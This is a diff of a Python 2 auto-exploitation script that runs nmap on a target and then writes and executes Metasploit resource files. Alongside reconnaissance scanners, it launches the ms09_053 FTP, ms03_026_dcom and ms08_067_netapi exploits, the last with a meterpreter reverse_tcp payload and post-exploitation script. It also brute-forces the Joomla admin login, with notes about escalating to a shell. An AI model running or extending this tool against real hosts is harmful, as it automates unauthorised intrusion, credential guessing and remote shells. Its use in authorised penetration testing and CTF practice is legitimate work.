@@ -28,20 +28,58 @@ path2post = tLogDir + postfile
 
 
 # test functions:
+#
+
+# modules for default FTP (based on 21/tcp)
+def check_21(target):
+  print '    + loading : current ftp modules'
+  print '      + anonymous'
+  print ''
+  print ''
+
+  saveNetRc('use auxiliary/scanner/ftp/anonymous\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+# saveNetRc('use auxiliary/scanner/ftp/ftp_login\n') # do you want to bruteforce? ;\
+  
+  saveNetRc('use auxiliary/scanner/ftp/ftp_version\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+
+# modules for Microsoft FTPd
+def check_21_ms(target): 
+  print '    + loading : current M$ ftp modules'
+  print '      + ms09_053_ftpd_nlst' # if MS FTP found
+  saveNetRc('use exploit/windows/ftp/ms09_053_ftpd_nlst\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('run\n')
+
+# modules for SSH
 def check_22(target):
-  print '    + loading : ssh modules...'
+  print '    + loading : current ssh modules:'
+  print '      + ssh_version'
   saveNetRc('use auxiliary/scanner/ssh/ssh_version\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
+# modules for rpcinfo
 def check_111(target):
-  print '    + loading : rpc modules'
+  print '    + loading : current rpc modules:'
   print '      + sunrpc_portmapper'
   saveNetRc('use auxiliary/scanner/misc/sunrpc_portmapper\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
+# modules for dcerpc
 def check_135(target):
+  print '    + loading : current dcerpc modules:'
+  print '      + ms03_026_dcom'
+  print '      + sunrpc_portmapper'
+  print '      + tcp_dcerpc_auditor'
+  print '      + endpoint_mapper'
+
   saveNetRc('use exploit/windows/dcerpc/ms03_026_dcom\n')
   saveNetRc('set RHOST ' + target + '\n')
   saveNetRc('run\n')
@@ -58,8 +96,16 @@ def check_135(target):
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
-
+# modules for SMB
 def check_139(target):
+  print '    + loading : current smb modules:'
+  print '      + nbname'
+  print '      + smb_enumshares'
+  print '      + smb_enumusers_domain'
+  print '      + smb_lookupsid'
+  print '      + pipe_auditor'
+  print '      + pipe_dcerpc_auditor'
+
   saveNetRc('use auxiliary/scanner/netbios/nbname\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
@@ -85,15 +131,21 @@ def check_139(target):
   saveNetRc('run\n')
 
 
+# modules if HTTP found 
 def check_http(target, rport):
   print '    + loading : http modules ...'
   print '      + http_header'
+  print '      + dir_scanner'
+  print '      + trace'
+  print '      + options'
+  print '      + robots_txt'
+  print '      + scrapper (get Title)'
+
   saveNetRc('use auxiliary/scanner/http/http_header\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + dir_scanner'
   saveNetRc('use auxiliary/scanner/http/dir_scanner\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set THREADS 10\n')
@@ -101,31 +153,27 @@ def check_http(target, rport):
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + trace'
   saveNetRc('use auxiliary/scanner/http/trace\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + options'
   saveNetRc('use auxiliary/scanner/http/options\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + robots_txt'
   saveNetRc('use auxiliary/scanner/http/robots_txt\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + scrapper (get Title)'
   saveNetRc('use auxiliary/scanner/http/scraper\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-
+# modules for Apache
 def check_apache(target, rport):
   print '    + loading : apache modules ...'
   print '      + apache_userdir_enum' 
@@ -135,20 +183,26 @@ def check_apache(target, rport):
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
+# modules for IIS
 def check_iis(target, rport):
   print '    + loading : iis modules ...'
-  print '     + webdav_scanner'
+  print '      + webdav_scanner'
   saveNetRc('use auxiliary/scanner/http/webdav_scanner\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-
+# modules for Joomla
 def check_joomla(target,rport):
   print '    + loading : joomla modules, port : ', rport
-
   print '      + joomla_bruteforce'
+  print '      + joomla_version'
+  print '      + joomla_plugins'
+  # TODO: finish joomla_upload_shell.rb 
+  # TODO: remember to properly set TARGETURI; see: dir_scanner
+
   saveWWWRc('use auxiliary/scanner/http/joomla_bruteforce_login\n')
+# saveWWWRc('set TARGETURI + ' + targeturi + '\n') TODO
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
   saveWWWRc('set AUTH_URI /joomla/administrator/index.php \n') # TODO: 3rd param targeturi
@@ -157,79 +211,102 @@ def check_joomla(target,rport):
   saveWWWRc('set USERNAME admin\n')
   saveWWWRc('set FORM_URI /joomla/administrator\n')
   saveWWWRc('set STOP_ON_SUCCESS true\n')
-  saveWWWRc('run\n') # TODO: get admin's login and escalate to shell
+  saveWWWRc('run\n') # TODO: get admin's login and escalate to shell 
 
-
-  print '      + joomla_version'
   saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
   saveWWWRc('run\n')
 
-  print '      + joomla_plugins'
   saveWWWRc('use auxiliary/scanner/http/joomla_plugins\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
   saveWWWRc('run\n')
 
-
+# modules for git
 def check_git(target, rport):
   print '    + loading : git modules ...'
+  print '      + git_scanner'
+
   saveNetRc('use auxiliary/scanner/http/git_scanner\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
+# modules for Axis2 CTF
 def check_axis2(target,rport):
   print '    + loading : axis2 modules...'
+  print '      + axis2_lfi_ctf' # you need to add this module to default msf
+
   saveWWWRc('use auxiliary/scanner/http/axis2_lfi_ctf\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
   saveWWWRc('run\n')
 
+# test will start during 2nd msf run. 
+# links found by dir_scanner are used here to define
+# tests for specific http server or webapp
+# TODO: more detailed tests...
 def check_http_dirs(target): 
   fp = open(rcspool,'r') # read from msf.net output file
   lines = fp.readlines()
-  
+
+
+  print '[+] Please wait, I\'m reading output from ' + str(rcspool) + '\n'  
   print '[+] Preparing HTTP attacks basing on found directories'
-  for line in lines:
+  for line in lines: # TODO add rport because later it will appear as a bug in readSpool()
     if line.find('Found http://') != -1:
+
+      # fix: set new rport
+      newport = line.split(':')
+      rrport = newport[2].split('/')[0]  # new RPORT for all tests below
+      
+#      print("Setting new RPORT for this test: " + str(rrport)) # for debug
       if line.find('/administrator/') != -1:
         print '  [+] probably Joomla; preparing tests...'
-        check_joomla(target,rport)
-      if line.find('/axis2/') != -1:
+        check_joomla(target,rrport)
+
+      if line.find('/server-status') != -1:
+        print '  [+] Found "/server-status"; probably Apache...'
+        # TODO: we need a 'marker' to set apache tests already done (if any) 
+        check_apache(target,rrport)
+
+      elif line.find('/axis2/') != -1: # prepared for CTF Axis2 by PentesterLab.com
+        # TODO: link to writeup
         print '  [+] probably Axis2; preparing tests...'
-	check_axis2(target,rport)
+	check_axis2(target,rrport)
+
       elif line.find('/joomla/') != -1:
         print '  [+] probably Joola; preparing tests...'
-        check_joomla(target, rport)
+        check_joomla(target, rrport)
+
       elif line.find('.git') != -1:
         print '  [+] probably git found; preparing tests...'
-        check_git(target, rport)
+        check_git(target, rrport)
 
-
-def check_443(target, rport):
-  print '    + loading : 443 modules ...'
+# modules if HTTPS found
+def check_https(target, rport):
+  print '    + loading : https modules ...'
   print '      + http_hsts'
+  print '      + cert'
+  print '      + ssl'
+  print '      + ssl_version'
+
   saveNetRc('use use auxiliary/scanner/http/http_hsts\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-
-  print '      + cert'
   saveNetRc('use auxiliary/scanner/http/cert\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT '  + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + ssl'
   saveNetRc('use auxiliary/scanner/http/ssl\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
-  print '      + ssl_version'
   saveNetRc('use auxiliary/scanner/http/ssl_version\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
@@ -238,6 +315,8 @@ def check_443(target, rport):
 
 def check_445(target):
   print '    + loading : 445 modules ...'
+  print '      + ms08_067_netapi'
+
   saveNetRc('use exploit/windows/smb/ms08_067_netapi\n')
   saveNetRc('set RHOST ' + target + '\n')
   saveNetRc('set PAYLOAD windows/meterpreter/reverse_tcp\n')
@@ -247,22 +326,26 @@ def check_445(target):
   saveNetRc('set AutoRunScript multi_console_command -rc ' + path2post + '\n')
   saveNetRc('run\n')
 
-
+# modules for SSDP/UPnP
 def check_2869(target):
   print '    + loading : 2869 modules ...'
   print '      + ssdp_msearch'
+  print '      + ssdp_amp'
+
   saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
-  print '      + ssdp_amp'
   saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
-
+# modules for SSDP/UPnP
 def check_5357(target):
   print '    + loading : 5357 modules ...'
+  print '      + ssdp_msearch'
+  print '      + ssdp_amp'
+
   saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
@@ -270,30 +353,39 @@ def check_5357(target):
   saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
-
-
 
 
 # code functions:
+# TODO: readSpool for output.www; more details; ...
 def thanks():
 # :)
   print '\n'
   print '*'*80
   print '\t\t(let\'s say...) summary:'
   print '*'*80
+  print '  Scanned : ', today
 
+  # summary for 1st msf
+  print '-'*80
+  print '  Summary for 1st output:\n'
   fp1 = open(nmaplogfile, 'r')
   s_ports = fp1.readlines()
   s_i = 0
   for p in s_ports:
     if p.find('open') != -1:
       s_i += 1
-      print p
+#      print p
+
+  # TODO: separate found and prepared here for tests ;)
   print '[+] Ports:'
   print '    Total: ', s_i
   print ''
 
-  fp2 = open(wwwspool, 'r')
+  # summary for 2nd msf 
+  print '-'*80
+  print '  Summary for 2nd output:\n' # TODO
+#  fp2 = open(wwwspool, 'r') # tmp change for reading output from 1st msf
+  fp2 = open(rcspool,'r')
   s_ports2 = fp2.readlines()
   s_i2 = 0
   for p2 in s_ports2:
@@ -303,14 +395,14 @@ def thanks():
   fp1.close()
   fp2.close()
 
-      
 
-
-def elhost(): # for LHOST
+# for LHOST 
+def elhost(): 
   f = os.popen('/sbin/ifconfig eth0 | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1')
   lhost=f.read()
   return lhost
 
+# RC for meterpreter; now prepared as poc for ms08_067_netapi module (check_445)
 def makePost(postme):
   fp = open(path2post,'w')
 
@@ -321,7 +413,8 @@ def makePost(postme):
   fp.write('exit\n') # TODO: make-meterpreter-exit bug
 
 
-
+# read loglines from output.msf spool
+# TODO: grab details to exploit bugs and/or prepare summary
 def readSpool(RCfp):
   print '[+] Reading spool from : ', RCfp
 
@@ -329,21 +422,25 @@ def readSpool(RCfp):
 
   print '[+] Finished reading spool from : ', RCfp
 
+# run msfconsole with defined RC file
 def runMsfScan(RCfp):
   print '[i] Starting Metasploit with RC file : ', RCfp
   exe = 'msfconsole -r ' + RCfp
   subprocess.call([ exe ], shell=True)
   print '[+] Finished Metasploit tests for : ', RCfp
 
+# save line to RC file for 2nd msf run (www tests)
 def saveWWWRc(line):
   fp = open(rcwww, 'a+')
   fp.write(line)
 
+# save line to RC file for 1st msf run
 def saveNetRc(line):
   fp = open(rcfile, 'a+')
   fp.write(line)
 
-
+# read nmap output file
+# TODO: grab details from nmap log
 def readScan(nmaplogfile):
   print '[+] Reading scan log...'
 
@@ -357,7 +454,14 @@ def readScan(nmaplogfile):
       global rport 
       rport = tmp_port[0]
 
-      if port.find('22/tcp') != -1:
+      if port.find('21/tcp') != -1:
+        print '[i] FTP found on port : ', rport
+        check_21(target)
+        if port.find('Microsoft ftpd') != -1:
+          print '[i] Probably Microsoft FTP; preparing...'
+          check_21_ms(target) 
+
+      elif port.find('22/tcp') != -1:
         print '[i] SSH found on port :', rport
         check_22(target)
 
@@ -385,7 +489,7 @@ def readScan(nmaplogfile):
 
       elif port.find('443/tcp') != -1:
         print '[i] HTTPS found on port: ', rport
-        check_443(target, rport)
+        check_https(target, rport)
       
 
       elif port.find('445/tcp') != -1:
@@ -403,8 +507,9 @@ def readScan(nmaplogfile):
   saveNetRc('exit\n')
   saveWWWRc('exit\n')
   rport = ''
-  print '[i] Reding log file : done.'
+  print '\n[i] Reading log file : done.'
 
+# run nmap against IP and save output to nmap log
 def scan(target):
   print '[+] Scanning :', target
   
@@ -413,10 +518,12 @@ def scan(target):
   subprocess.call([ exe ], shell=True)
   print '[+] Finished.'
 
+# check for current RC, if any, move to .old
 def moveRc(fp):
   moveme = 'mv ' + str(fp) + ' ' + str(fp) + '.old'
   subprocess.call([ moveme], shell=True)
 
+# prepare environment; dirs, logs, etc...
 def prepareEnv():
   print '[+] Preparing environment...'
 
@@ -456,6 +563,8 @@ def prepareEnv():
       print '[+] Network RC file created at : ' + rcfile
     except OSError, e:
       print e
+    except IOError, e:
+      print e
 
   if os.path.isfile(rcwww) != -1:
     try:
@@ -465,8 +574,8 @@ def prepareEnv():
     except OSError, e:
       print e
   
-
-
+# welcome msg + date
+# TODO: date to log/summary
 def sayHi():
   print ''
   print '*'*80
@@ -489,7 +598,8 @@ readSpool(rcspool)
 runMsfScan(rcwww)
 #readSpool(rcwww)
 
-thanks()
+thanks() # TODO: detailed summary
+# 
 # more:
 # http://code610.blogspot.com
 #
